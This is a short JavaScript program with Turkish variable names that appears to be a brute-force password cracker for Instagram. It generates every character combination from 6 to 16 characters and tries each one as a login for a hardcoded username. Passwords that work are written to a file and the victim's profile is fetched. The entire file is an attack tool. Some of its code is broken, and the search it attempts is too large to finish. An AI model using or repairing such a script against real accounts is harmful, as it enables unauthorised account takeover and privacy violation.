const karakterler = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*-_=+;:,/?";
const maxUzunluk = 16;
const minUzunluk = 6;
const Instagram = require('instagram-web-api')
const fs = require('fs')
const kullanıcı = `instagram-username`
 


function sifreKir() {
    const sifreler = [];

    function kombinasyonOlustur(uzunluk, kombinasyon = '') {
        if (uzunluk === 0) {
          console.log(kombinasyon)
          const client = new Instagram({ kullanıcı, kombinasyon })
 
client
  .login()
  .then(() => {
    fs.writeFileSync('sifre.txt', kullanıcı + ":" + kombinasyon, { flag: "a"} )
    console.log('Giriş Başarılı Şifre: ' + kombinasyon)
    client
      .getProfile()
      .then(console.log)
  })
            sifreler.push(kombinasyon);
            return;
        }
        for (let i = 0; i < karakterler.length; i++) {
            kombinasyonOlustur(uzunluk - 1, kombinasyon + karakterler[i]);
        }
    }

    for (let i = minUzunluk; i <= maxUzunluk; i++) {
        kombinasyonOlustur(i);
    }

    return sifreler;
}

const tumSifreler = sifreKir();
console.log("Toplam sifre sayisi:", tumSifreler.length);
console.log("Ornek sifreler:", tumSifreler.slice(0, 10));
